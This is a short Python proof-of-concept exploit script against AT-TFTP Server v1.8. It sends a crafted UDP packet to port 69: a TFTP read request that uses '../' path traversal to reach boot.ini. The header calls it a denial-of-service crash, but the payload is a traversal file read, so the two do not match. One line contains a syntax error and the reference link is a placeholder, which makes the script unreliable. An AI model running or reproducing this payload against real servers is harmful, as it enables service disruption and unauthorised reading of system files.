#!/usr/bin/python

##############################################################################
# Exploit   : http://secpod.org/blog/?p=XXXXXXXXXXXXXXXXXXXXXXXXX
#             http://secpod.org/wintftp_dos_poc.py
# Reference : 
# Author    : Antu Sanadi from SecPod Technologies (www.secpod.com)
#
# Exploit will crash AT-TFTP Server v1.8 Service
# Tested against AT-TFTP Server v1.8 server
##############################################################################

import socket
import sys

host = '127.0.0.1'
port = 69

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
	print "socket() failed"
	sys.exit(1)

addr = (host,port)1

data ='\x00\x01\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x62\x6f\x6f' +\
      '\x74\x2e\x69\x6e\x69\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00'
s.sendto(data, (host, port))

